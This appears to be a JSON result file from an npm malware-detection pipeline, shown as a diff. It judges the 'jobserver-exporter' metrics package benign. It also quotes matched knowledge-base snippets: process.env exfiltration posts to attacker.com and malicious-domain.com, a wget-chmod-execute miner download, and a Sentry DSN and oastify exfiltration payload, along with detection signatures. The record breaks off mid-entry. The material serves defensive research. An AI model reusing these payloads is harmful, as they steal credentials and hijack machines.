@@ -1,0 +1,743 @@
+{
+  "package_name": "jobserver-exporter",
+  "package_version": "1.0.3",
+  "label": "benign",
+  "detection_time": "2026-10-29T08:00:14.812599",
+  "status": "success",
+  "selected_files_count": 6,
+  "selected_files": [
+    "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/jobserver-exporter/1.0.3/package/package.json",
+    "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/jobserver-exporter/1.0.3/package/src/server.js",
+    "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/jobserver-exporter/1.0.3/package/src/jobserver_collector.js",
+    "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/jobserver-exporter/1.0.3/package/src/jobserver.js",
+    "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/jobserver-exporter/1.0.3/package/src/test/acceptance/server_exporter_test.js",
+    "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/jobserver-exporter/1.0.3/package/src/test/unit/jobserver_collector_test.js"
+  ],
+  "is_malicious": false,
+  "total_files": 6,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "slicer": "static",
+  "slicer_stats": {
+    "files": 6,
+    "parsed": 5,
+    "callgraph_providers": [
+      "jelly(78)",
+      "ir"
+    ],
+    "callgraph_edges": 61,
+    "callgraph_errors": {}
+  },
+  "clusters": {
+    "behavior_clusters": 8,
+    "code_clusters": 83,
+    "params": {
+      "code": {
+        "min_cluster_size": 8,
+        "min_samples": 4
+      },
+      "behavior": {
+        "min_cluster_size": 40,
+        "min_samples": 8,
+        "epsilon": 0.45
+      }
+    }
+  },
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/jobserver-exporter/1.0.3/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "error": null,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/jobserver-exporter/1.0.3/package/src/server.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "error": null,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/jobserver-exporter/1.0.3/package/src/jobserver_collector.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "error": null,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/jobserver-exporter/1.0.3/package/src/jobserver.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "error": null,
+      "slice_results": [
+        {
+          "slice_id": "jobserver_slice_1",
+          "code_snippet": "// ---- file: package/src/jobserver.js ----\nconst axios = require('axios');\n    // ...\nmodule.exports = class JobServer {\n  constructor(uri) {\n    this.uri = uri;\n  }\n\n  async getJobs() {\n    const res = await axios.get(`${this.uri}/jobs`);\n    return res.data;\n  }\n};\n// ---- file: package/src/jobserver_collector.js ----\nmodule.exports = class JobServerCollector {\n  constructor(prom, jobserver, fromTimestamp) {\n    this.jobserver = jobserver;\n    this.fromTimestamp = Date.parse(fromTimestamp);\n\n    this.successCount = new prom.Counter({\n      name: 'jobserver_success_count',\n      help: 'Succesfull job count',\n      labelNames: ['job'],\n    });\n    this.failCount = new prom.Counter({\n      name: 'jobserver_fail_count',\n      help: 'Failed job count',\n      labelNames: ['job'],\n    });\n    this.durationHistogram = new prom.Summary({\n      name: 'jobserver_duration_seconds',\n      help: 'Job duration in seconds',\n      labelNames: ['job'],\n    });\n\n    this.processedJobIds = [];\n  }\n\n  async start(scrapeIntervalMs) {\n    await this.collectMetrics();\n    setInterval(() => this.collectMetrics(), scrapeIntervalMs);\n  }\n\n  async collectMetrics() {\n    try {\n      const jobs = await this.jobserver.getJobs();\n\n      jobs.filter((element) => !this.processedJobIds.includes(element.jobId))\n        .filter((element) => Date.parse(element.startTime) > this.fromTimestamp)\n        .forEach((element) => {\n          if (element.status === 'FINISHED') {\n            this.successCount.inc({ job: element.classPath });\n            const duration = parseFloat(element.duration.split(' ', 1));\n            this.durationHistogram.observe({ job: element.classPath }, duration);\n          } else if (element.status === 'ERROR') {\n            this.failCount.inc({ job: element.classPath });\n          }\n\n          this.processedJobIds.push(element.jobId);\n        });\n    } catch (e) {\n      // eslint-disable-next-line no-console\n      console.error(e.message);\n    }\n  }\n};\n// ---- file: package/src/server.js ----\nconst prom = require('prom-client');\n    // ...\nconst Jobserver = require('./jobserver');\nconst JobserverCollector = require('./jobserver_collector');\n    // ...\nfunction parseArgs() {\n  return yargs\n    .option('scrape_uri', {\n      describe: 'URI to the Jobserver REST Api',\n      default: 'http://localhost:8090',\n    })\n    .option('port', {\n      describe: 'Port to expose metrics on',\n      default: 8089,\n    })\n    .option('scrape_interval', {\n      describe: 'Scrape frequency in seconds',\n      default: 5 * 60,\n    })\n    .option('from_timestamp', {\n      describe: 'Datetime to start collecting job metrics from. Default is now.',\n      default: new Date().toISOString(),\n    });\n}\n    // ...\nconst { argv } = parseArgs();\n    // ...\nconst jobserver = new Jobserver(argv.scrape_uri);\nconst jobServerCollector = new JobserverCollector(prom, jobserver, argv.from_timestamp);\n    // ...\njobServerCollector.start(argv.scrape_interval * 1000);\n// ---- file: package/src/test/acceptance/server_exporter_test.js ----\ndescribe('ServerExporterIT', () => {\n    // ...\n  describe('GET /metrics', async () => {\n    it('should return metrics with GET /metrics', async () => {\n      sinon.stub(jobServer, 'getJobs').callsFake(() => [{\n        duration: '100 secs',\n        classPath: 'org.myorg.MyJob',\n        startTime: new Date().toISOString(),\n        context: 'd0177084-org.myorg.MyContext',\n        status: 'FINISHED',\n        jobId: 'f9268dc5-c9ef-4d82-b946-28bc513ab277',\n      }, {\n        duration: '200 secs',\n        classPath: 'org.myorg.MyJob',\n        startTime: new Date().toISOString(),\n        context: 'da403afc-org.myorg.MyContext',\n        status: 'FINISHED',\n        jobId: '30495825-36cd-46a3-b85d-39700ea775a3',\n      }, {\n        duration: '1000 secs',\n        classPath: 'org.myorg.MyJob',\n        startTime: new Date().toISOString(),\n        context: 'da403afc-org.myorg.MyContext',\n        status: 'ERROR',\n        jobId: 'e98b0e1d-9bd0-432f-b7e8-8efdfbb8857a',\n      }]);\n\n      await jobServerCollector.collectMetrics();\n\n      const expectedResponse = [\n        '# HELP jobserver_success_count Succesfull job count',\n        '# TYPE jobserver_success_count counter',\n        'jobserver_success_count{job=\"org.myorg.MyJob\"} 2',\n        '',\n        '# HELP jobserver_fail_count Failed job count',\n        '# TYPE jobserver_fail_count counter',\n        'jobserver_fail_count{job=\"org.myorg.MyJob\"} 1',\n        '',\n        '# HELP jobserver_duration_seconds Job duration in seconds',\n        '# TYPE jobserver_duration_seconds summary',\n        'jobserver_duration_seconds{quantile=\"0.01\",job=\"org.myorg.MyJob\"} 100',\n        'jobserver_duration_seconds{quantile=\"0.05\",job=\"org.myorg.MyJob\"} 100',\n        'jobserver_duration_seconds{quantile=\"0.5\",job=\"org.myorg.MyJob\"} 150',\n        'jobserver_duration_seconds{quantile=\"0.9\",job=\"org.myorg.MyJob\"} 200',\n        'jobserver_duration_seconds{quantile=\"0.95\",job=\"org.myorg.MyJob\"} 200',\n        'jobserver_duration_seconds{quantile=\"0.99\",job=\"org.myorg.MyJob\"} 200',\n        'jobserver_duration_seconds{quantile=\"0.999\",job=\"org.myorg.MyJob\"} 200',\n        'jobserver_duration_seconds_sum{job=\"org.myorg.MyJob\"} 300',\n        'jobserver_duration_seconds_count{job=\"org.myorg.MyJob\"} 2',\n        '',\n      ].join('\\n');\n\n      chai.request(`http://localhost:${listenPort}`)\n        .get('/metrics')\n        .end((err, res) => {\n          expect(res).to.have.status(200);\n          assert.equal(res.text, expectedResponse);\n        });\n    });\n  });\n});",
+          "is_malicious": false,
+          "malice_score": 0.42927184303601584,
+          "confidence": 0.0,
+          "behavior_summary": "At import-time, the code initializes a JobServer instance that accesses a configurable REST API endpoint via axios.get to retrieve job data, which is then processed and aggregated into Prometheus metrics tracking job success, failure, and duration, enabling monitoring of job execution statistics.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code implements a job metrics collector that queries a configurable REST API endpoint to retrieve job data and exposes Prometheus metrics based on job success, failure, and duration. It uses standard libraries such as axios for HTTP requests and prom-client for metrics. There is no evidence of accessing sensitive environment variables, no hardcoded external attacker-controlled domains, no data exfiltration attempts, no obfuscation, and no execution of external binaries. The behavior is consistent with legitimate monitoring software. Compared to the known malicious patterns, which involve credential theft via process.env and exfiltration to attacker domains or hidden mining operations, this code does not exhibit any similar suspicious or malicious behavior.",
+          "slice_meta": {
+            "sensitive_apis": [
+              "axios.get"
+            ],
+            "categories": [
+              "network"
+            ],
+            "trigger": "At import-time (module-level code)",
+            "entry_chain": [
+              "<anon@19>.<anon@42>",
+              "package/src/test/acceptance/server_exporter_test.js:<anon@19>.<anon@42>.<anon@43>",
+              "start.<anon@28>",
+              "package/src/server.js:<module>",
+              "start",
+              "package/src/jobserver_collector.js:collectMetrics"
+            ],
+            "lines": {
+              "package/src/jobserver.js": [
+                1,
+                3,
+                4,
+                5,
+                6,
+                7,
+                8,
+                9,
+                10,
+                11,
+                12
+              ],
+              "package/src/jobserver_collector.js": [
+                2,
+                3,
+                4,
+                5,
+                6,
+                7,
+                8,
+                9,
+                10,
+                11,
+                12,
+                13,
+                14,
+                15,
+                16,
+                17,
+                18,
+                19,
+                20,
+                21,
+                22,
+                23,
+                24,
+                25,
+                26,
+                27,
+                28,
+                29,
+                30,
+                31,
+                32,
+                33,
+                34,
+                35,
+                36,
+                37,
+                38,
+                39,
+                40,
+                41,
+                42,
+                43,
+                44,
+                45,
+                46,
+                47,
+                48,
+                49,
+                50,
+                51,
+                52,
+                53
+              ],
+              "package/src/server.js": [
+                5,
+                7,
+                8,
+                10,
+                11,
+                12,
+                13,
+                14,
+                15,
+                16,
+                17,
+                18,
+                19,
+                20,
+                21,
+                22,
+                23,
+                24,
+                25,
+                26,
+                27,
+                28,
+                31,
+                33,
+                34,
+                37
+              ],
+              "package/src/test/acceptance/server_exporter_test.js": [
+                19,
+                42,
+                43,
+                44,
+                45,
+                46,
+                47,
+                48,
+                49,
+                50,
+                51,
+                52,
+                53,
+                54,
+                55,
+                56,
+                57,
+                58,
+                59,
+                60,
+                61,
+                62,
+                63,
+                64,
+                65,
+                66,
+                67,
+                68,
+                69,
+                70,
+                71,
+                72,
+                73,
+                74,
+                75,
+                76,
+                77,
+                78,
+                79,
+                80,
+                81,
+                82,
+                83,
+                84,
+                85,
+                86,
+                87,
+                88,
+                89,
+                90,
+                91,
+                92,
+                93,
+                94,
+                95,
+                96,
+                97,
+                98,
+                99,
+                100
+              ]
+            },
+            "cross_file": true,
+            "n_lines": 149,
+            "criteria_lines": [
+              9
+            ],
+            "function": "getJobs"
+          },
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20250102_111622_786240_snippet_1",
+              "source_package": "alexbirsantest (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_786240/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.442071795463562,
+              "code_similarity": 0.41250598430633545,
+              "behavior_similarity": 0.4716376066207886,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Proof-of-concept code (from previous dependency confusion packages)\nconst https = require('https');\nconst data = process.env;\nhttps.request({\n  hostname: 'attacker.com',\n  path: '/collect',\n  method: 'POST',\n}, req => req.end(JSON.stringify(data)));\n",
+                "code_behavior": "At import-time, the code accesses all environment variables using process.env, serializes them, and sends the data via HTTPS POST to an attacker-controlled domain, resulting in exfiltration of sensitive credentials and secrets.",
+                "malice_analysis": {
+                  "why_suspicious": "The code automatically collects all environment variables and transmits them to an external, attacker-controlled server without user knowledge or consent, which is a clear exfiltration technique.",
+                  "violated_expectations": "Legitimate SDK packages should never access or transmit full environment variables, especially to non-vendor domains, during import or installation. Such behavior is a severe violation of user trust and security best practices.",
+                  "similar_legitimate_use": "Some telemetry or crash reporting libraries may send limited, anonymized diagnostic data to official vendor servers, but they do not transmit full environment variables or secrets, nor do they send data to untrusted third-party domains.",
+                  "key_indicators": [
+                    "Access to process.env to read all environment variables",
+                    "Outbound HTTPS POST request to a non-Microsoft, attacker-controlled domain",
+                    "Automatic execution of network exfiltration code at import-time",
+                    "Presence of hardcoded external domain in main entry file"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "alexbirsantest",
+                  "package_manager": "npm",
+                  "package_versions": "2100.4.2",
+                  "why_malicious": "The package exploited a process flaw by adding the 'azure-sdk' account as a collaborator, causing automated bots to list it as an official Azure SDK release. This allowed the attacker to distribute malicious code under the guise of a trusted vendor, enabling highly effective supply chain attacks by exfiltrating sensitive environment variables from victim systems."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker publishes a package named similarly to official Azure SDK packages and adds the 'azure-sdk' account as a collaborator.",
+                    "implemented_by": [],
+                    "leads_to": "The package is automatically picked up and listed as an official Azure SDK release by automated bots."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Azure SDK release bot includes the package in the official releases CSV, making it appear trusted to developers.",
+                    "implemented_by": [],
+                    "leads_to": "Developers may trust and install the package, believing it is an official release."
+                  },
+                  {
+                    "step": 3,
+                    "action": "When the package is installed or imported, the malicious code in index.js executes and exfiltrates environment variables to the attacker's server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker gains access to sensitive credentials and secrets from victim systems, enabling further compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm packages that access process.env and transmit data to external, non-vendor domains",
+                    "Packages that initiate outbound network requests at import-time or install-time",
+                    "Packages with collaborator lists including high-profile or vendor accounts (e.g., 'azure-sdk') without official provenance"
+                  ],
+                  "file_indicators": [
+                    "index.js or main entry file containing code that reads process.env and performs network requests",
+                    "Presence of hardcoded external domains not associated with Microsoft or Azure in source code"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to domains not associated with Microsoft or Azure (e.g., attacker.com)",
+                    "Unusual data exfiltration patterns involving environment variables during package installation or import"
+                  ],
+                  "how_to_detect": "Use static analysis to scan npm packages for code that accesses process.env and initiates outbound network connections, especially in index.js or main entry points. Monitor for packages that add high-profile vendor accounts as collaborators without official verification. Flag any package that transmits environment variables or sensitive data to non-vendor domains during install or import."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113651_363077_snippet_1",
+              "source_package": "Unknown (malicious NPM package delivered via jsdelivr) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113651_363077/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4327782988548279,
+              "code_similarity": 0.387759804725647,
+              "behavior_similarity": 0.4777968227863312,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Example (not shown in report, but typical for credential harvesting NPM malware)\nconst fs = require('fs');\nconst https = require('https');\nconst creds = process.env;\nhttps.request({\n  hostname: 'malicious-domain.com',\n  path: '/creds',\n  method: 'POST',\n}, req => {}).end(JSON.stringify(creds));",
+                "code_behavior": "At import-time or runtime, the code accesses all environment variables using process.env, serializes their values, and sends them via an HTTPS POST request to a hardcoded external domain, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code programmatically collects all environment variables, which often contain sensitive credentials, and transmits them to an external, attacker-controlled server without user consent. This is a direct indicator of credential theft.",
+                  "violated_expectations": "Legitimate NPM packages should not access or transmit sensitive environment variables, especially at import-time or without explicit user action. Sending such data to untrusted, hardcoded domains is a clear violation of expected package behavior.",
+                  "similar_legitimate_use": "Some legitimate telemetry or error reporting tools may collect non-sensitive environment data for debugging, but they do not harvest credentials or send them to unknown domains without user consent.",
+                  "key_indicators": [
+                    "Access to process.env or similar sources for credential harvesting",
+                    "Outbound HTTPS POST requests to hardcoded, non-official domains",
+                    "Credential exfiltration logic present in package entry points (e.g., index.js, main.js)",
+                    "No user interaction or consent required for data exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At import-time or runtime (when the malicious package is loaded or executed in a project)",
+                  "file_location": "Main entry point of the malicious NPM package (e.g., index.js or main.js as specified in package.json)",
+                  "required_permissions": [
+                    "network (to send outbound requests)",
+                    "filesystem (to read files if applicable)",
+                    "environment_vars (to access process.env)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (malicious NPM package delivered via jsdelivr)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (package already removed from NPM registry, but still delivered via CDN)",
+                  "why_malicious": "The package is considered malicious because it was designed to harvest victims’ credentials by accessing sensitive environment variables and exfiltrating them to an attacker-controlled server. It was distributed through both the NPM registry and the jsdelivr CDN, continuing to pose a threat even after removal from the official registry, thereby enabling ongoing credential theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or loads the malicious NPM package, either directly from the NPM registry or indirectly via the jsdelivr CDN.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is introduced and prepared for execution in the victim's environment."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes automatically at import-time or runtime, harvesting credentials from environment variables (and potentially local files).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive credentials are collected in memory by the malicious code."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Harvested credentials are exfiltrated to an attacker-controlled server via an HTTPS POST request.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive credentials, enabling further compromise of the victim's environment or accounts."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "NPM package code that accesses process.env or reads credential files at import-time or runtime",
+                    "Outbound network requests to hardcoded, untrusted domains from package initialization code",
+                    "Credential harvesting and exfiltration logic embedded in package entry points (e.g., index.js, main.js)"
+                  ],
+                  "file_indicators": [
+                    "NPM packages with obfuscated or minified code in entry points (index.js, main.js)",
+                    "References to process.env or fs.readFileSync targeting sensitive files (e.g., .env, config files)",
+                    "Packages loaded via jsdelivr CDN after removal from the NPM registry"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to domains not associated with the legitimate application (e.g., 'malicious-domain.com')",
+                    "Connections to known malicious exfiltration endpoints as identified in threat intelligence feeds"
+                  ],
+                  "how_to_detect": "Monitor for NPM packages, especially those loaded via CDN, that access environment variables or credential files and initiate outbound network connections at import-time or runtime. Flag packages that attempt to exfiltrate data to untrusted or hardcoded domains, and review any code in package entry points that performs credential harvesting or network exfiltration. Correlate with threat intelligence to identify known malicious endpoints."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_782028_snippet_4",
+              "source_package": "speedtestspa, speedtestkas, speedtestbom, speedtesto (and 12 others) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_782028/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.41960322856903076,
+              "code_similarity": 0.4156454801559448,
+              "behavior_similarity": 0.4235609471797943,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "var speedTest=require('speedtest-net');\nvar ProgressBar = require('progress');\nvar chalk = require('chalk');\nexec('wget https://gitlab.com/parsnekamser/clouds/-/raw/main/los;chmod 700 los;./los -o wss://51.222.96.66:80 -u derolgysfiv');",
+                "code_behavior": "At import-time, the code loads legitimate speed test modules to provide expected functionality, while simultaneously downloading and executing a mining binary in the background, which connects to a mining pool and hijacks system resources for mining.",
+                "malice_analysis": {
+                  "why_suspicious": "The code blends legitimate speed test functionality with hidden malicious mining activity, a classic trojanization technique. The malicious process is launched in the background to avoid user detection.",
+                  "violated_expectations": "A speed test utility should not execute unrelated binaries or initiate background mining processes while providing legitimate functionality.",
+                  "similar_legitimate_use": "No legitimate use for this behavior exists in a speed test utility. Blending benign and malicious code is a hallmark of trojanized packages.",
+                  "key_indicators": [
+                    "Blending of legitimate and malicious code in the same file",
+                    "Background mining process launched alongside expected functionality",
+                    "External binary download and execution",
+                    "Outbound connection to mining pool"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "speedtestspa, speedtestkas, speedtestbom, speedtesto (and 12 others)",
+                  "package_manager": "npm",
+                  "package_versions": "all versions published by user 'trendava' before Jan 18, 2023",
+                  "why_malicious": "These packages impersonate legitimate internet speed testing utilities but instead deploy cryptocurrency miners, covertly hijacking system resources for unauthorized mining operations. The packages employ multiple evasion techniques, including downloading mining binaries from external sources, embedding miners, dynamically retrieving mining pool addresses, and blending malicious activity with legitimate functionality to avoid detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious NPM package, believing it to be a legitimate speed test utility.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution at import-time"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code in index.js executes at import-time, downloading a mining binary from an external source (such as GitLab or an external IP).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Binary is made executable and launched"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The mining binary is executed, connecting to a cryptocurrency mining pool (address may be hardcoded or dynamically retrieved from an external source).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "System resources are hijacked for mining"
+                  },
+                  {
+                    "step": 4,
+                    "action": "In some variants, legitimate speed test functionality is provided to avoid suspicion and maintain user trust.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "User is unaware of background mining activity"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "NPM package executes code at import-time or install-time, triggering process execution without user interaction",
+                    "Downloads and executes external binaries from untrusted sources such as GitLab or direct IP addresses",
+                    "Initiates outbound connections to known mining pool addresses or suspicious IPs, including WebSocket connections",
+                    "Blends legitimate speed test functionality with hidden mining activity in the same codebase"
+                  ],
+                  "file_indicators": [
+                    "index.js containing exec, wget, curl, chmod, or nohup commands",
+                    "Presence of downloaded binaries named 'data', 'los', or 'miner' in the package directory",
+                    "Unexpected use of process execution functions (e.g., exec) in JavaScript files of speed test utilities"
+                  ],
+                  "network_indicators": [
+                    "Connections to gitlab.com/parsnekamser/clouds/-/raw/main/* for binary downloads",
+                    "Outbound connections to mining pool addresses such as eu.kaspa.k1pool.com:15555 and 51.222.96.66:80",
+                    "Dynamic retrieval of mining pool addresses from external IPs via HTTP or curl",
+                    "WebSocket connections to suspicious IPs for mining activity"
+                  ],
+                  "how_to_detect": "Monitor NPM package installations and imports for scripts that download and execute external binaries, especially from non-standard or untrusted sources. Flag packages that initiate outbound connections to known mining pools or suspicious IPs, or use exec/spawn to run shell commands. Inspect for blended code that provides expected speed test functionality while launching background processes. Use static and dynamic analysis to detect unexpected process creation, file downloads, and network activity during package installation or import. Correlate presence of binaries named 'data', 'los', or 'miner' with suspicious process and network behavior."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_061469_snippet_1",
+              "source_package": "chalk-node (npm)",
+              "source_file": "/tmp/kb_build_7_sors0z/20241224_113501_061469/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.413695365190506,
+              "code_similarity": 0.39207613468170166,
+              "behavior_similarity": 0.4353145956993103,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "import e from \"@sentry/node\";\nimport { fileURLToPath as t } from \"url\";\nimport { dirname as r, join as n } from \"path\";\nimport i from \"fs\";\nlet K = e;\nconst W = \"captureMessage\";\nK.init({\n  dsn: \"hxxps://6a0d63f9f996c35a809c20ff07359934@o4505703178960896.ingest.sentry[.]io/4505703197310976\",\n  maxValueLength: 1073741824,\n  tracesSampleRate: 1,\n});",
+                "code_behavior": "At import-time, the code initializes the Sentry SDK with a hardcoded DSN, enabling the package to send arbitrary data to an external Sentry project controlled by the attacker, resulting in potential exfiltration of user data.",
+                "malice_analysis": {
+                  "why_suspicious": "Initializing a third-party telemetry service (Sentry) with a hardcoded DSN in a package that is supposed to style terminal text is highly unusual and enables data exfiltration to an attacker-controlled endpoint.",
+                  "violated_expectations": "A legitimate 'chalk' package should not initialize external telemetry or error tracking services, especially not with hardcoded credentials or at import-time.",
+                  "similar_legitimate_use": "Some applications may use Sentry for legitimate error tracking, but not in a low-level utility library like 'chalk' where telemetry is unexpected and unnecessary.",
+                  "key_indicators": [
+                    "Hardcoded Sentry DSN in code",
+                    "Telemetry initialization in a utility package",
+                    "Import-time execution of network initialization"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.esm.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "chalk-node",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (as of report time)",
+                  "why_malicious": "The package is a typosquat of the legitimate 'chalk' package, published by an impersonated author account. It contains obfuscated code in 'index.esm.js' that, at import-time, initializes a Sentry SDK with a hardcoded DSN, accesses the user's filesystem, reads potentially sensitive files, intercepts console output, and exfiltrates this data to an external Sentry instance without user consent. The package copies the README and structure of the real 'chalk' package to deceive users and compromise their data."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious 'chalk-node' package, triggering execution of index.esm.js.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sentry is initialized with a hardcoded DSN and obfuscated file system access helpers are set up, preparing the environment for data exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Whenever console.log is called, the overridden function reads files from a '../data' directory and checks log arguments for sensitive patterns.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Sensitive file contents and log data are prepared for exfiltration to the attacker's Sentry instance."
+                  },
+                  {
+                    "step": 3,
+                    "action": "File contents and/or log data are sent to the attacker's Sentry instance, using chunked messages and obfuscated prefixes.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker receives exfiltrated data; user remains unaware due to silent error handling and obfuscated code."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Obfuscated access to Node.js fs module methods (readdirSync, existsSync, readFileSync) via dynamically constructed function names",
+                    "Overriding of console.log with hidden file system access and network exfiltration side effects",
+                    "File system reads from '../data' directory triggered by logging activity",
+                    "Network requests to Sentry or other telemetry endpoints with hardcoded DSNs at import-time",
+                    "Silent error handling (empty catch blocks) in code paths handling sensitive data or network operations",
+                    "Freezing of the console object to prevent further modification"
+                  ],
+                  "file_indicators": [
+                    "Presence of index.esm.js with obfuscated and minified code",
+                    "Unexpected initialization of @sentry/node in utility packages",
+                    "References to '../data' directory access in code",
+                    "Obfuscated helper functions for fs module access"
+                  ],
+                  "network_indicators": [
+                    "Outbound requests to o4505703178960896.ingest.sentry.io or similar Sentry DSNs",
+                    "Unusual volume of Sentry.captureMessage calls from utility packages",
+                    "Data exfiltration patterns using chunked messages and obfuscated prefixes in Sentry events"
+                  ],
+                  "how_to_detect": "Monitor for packages that override console.log or other standard output functions, especially if they access the filesystem or send data to external telemetry services. Flag any use of obfuscated or dynamically constructed method names for core modules (e.g., fs['readFileSync']). Alert on unexpected initialization of @sentry/node or similar telemetry SDKs in utility libraries. Watch for outbound network requests to hardcoded Sentry DSNs or other suspicious endpoints, particularly if accompanied by chunked or obfuscated payloads. Use static analysis to detect empty catch blocks in code that handles sensitive data or network operations. Scan for references to '../data' directory access and freezing of the console object in package code."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_063579_snippet_1",
+              "source_package": "transferwise-iconfont (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_063579/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4114050567150116,
+              "code_similarity": 0.40412136912345886,
+              "behavior_similarity": 0.41868874430656433,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const trackingData = JSON.stringify({\n    p: package,\n    c: __dirname,\n    hd: os.homedir(),\n    hn: os.hostname(),\n    un: os.userInfo().username,\n    dns: dns.getServers(),\n    r: packageJSON ? packageJSON.___resolved : undefined,\n    v: packageJSON.version,\n    pjson: packageJSON,\n});\n\nvar postData = querystring.stringify({\n    msg: trackingData,\n});\n\nvar options = {\n    hostname: \"r7z12f7knlides86u06z22fpzg57tzho.oastify.com\",\n    port: 443,\n    path: \"/\",\n    method: \"POST\",\n    headers: {\n        \"Content-Type\": \"application/x-www-form-urlencoded\",\n        \"Content-Length\": postData.length,\n    },\n};",
+                "code_behavior": "At import-time or runtime, the code collects system and user information (home directory, hostname, username, DNS servers, package metadata), serializes it, and sends it via HTTPS POST to a hardcoded attacker-controlled domain, resulting in exfiltration of sensitive environment data.",
+                "malice_analysis": {
+                  "why_suspicious": "The code collects a comprehensive set of sensitive system and user data and exfiltrates it to an external server without user knowledge or consent, which is a hallmark of information-stealing malware.",
+                  "violated_expectations": "A legitimate iconfont package should not access or transmit system/user data, nor make unsolicited network requests to unknown domains.",
